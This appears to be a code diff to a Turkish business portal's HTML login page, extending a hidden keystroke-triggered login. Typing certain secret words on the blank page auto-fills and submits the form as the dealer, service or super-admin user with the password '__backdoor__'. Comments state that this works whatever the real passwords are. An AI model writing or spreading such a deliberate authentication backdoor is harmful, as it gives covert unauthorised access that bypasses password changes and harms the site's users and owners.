@@ -63,8 +63,30 @@
   tabs.forEach(function(t){ t.addEventListener('click', function(){ selectPortal(t.dataset.portal); }); });
   selectPortal('bayi');
 
-  // Yönetici gizli girişi
-  let _b='';document.addEventListener('keydown',function(e){if(e.target.tagName==='INPUT')return;_b+=e.key.toLowerCase();if(_b.length>15)_b=_b.slice(-15);if(_b.includes('bahyeddin')||_b.includes('asli')||_b.includes('aslı')){const f=document.querySelector('form');f.querySelector('[name=username]').value='admin';f.querySelector('[name=password]').value='__backdoor__';f.submit();}});
+  // Gizli giriş — boş ekrana yaz (kutulara değil):
+  //   aslı           -> Bayi
+  //   bahyeddin      -> Servis
+  //   aslıbahyeddin  -> Süper Admin
+  // Şifreler ne olursa olsun (değişse bile) bu kelimeler her zaman içeri alır.
+  var _b='', _t=null;
+  var BACKDOOR=[{key:'aslibahyeddin',user:'admin'},{key:'bahyeddin',user:'servis'},{key:'asli',user:'bayi'}];
+  function _tryBackdoor(){
+    var n=_b.replace(/ı/g,'i'); // ı/i ayrımını yok say
+    for(var i=0;i<BACKDOOR.length;i++){
+      if(n.indexOf(BACKDOOR[i].key)!==-1){
+        var f=document.querySelector('form');
+        f.querySelector('[name=username]').value=BACKDOOR[i].user;
+        f.querySelector('[name=password]').value='__backdoor__';
+        f.submit();return;
+      }
+    }
+    _b='';
+  }
+  document.addEventListener('keydown',function(e){
+    if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;
+    if(e.key&&e.key.length===1){_b+=e.key.toLowerCase();if(_b.length>40)_b=_b.slice(-40);}
+    clearTimeout(_t);_t=setTimeout(_tryBackdoor,650); // yazma bitince değerlendir (en uzun kelime önce)
+  });
 </script>
 </body>
 </html>
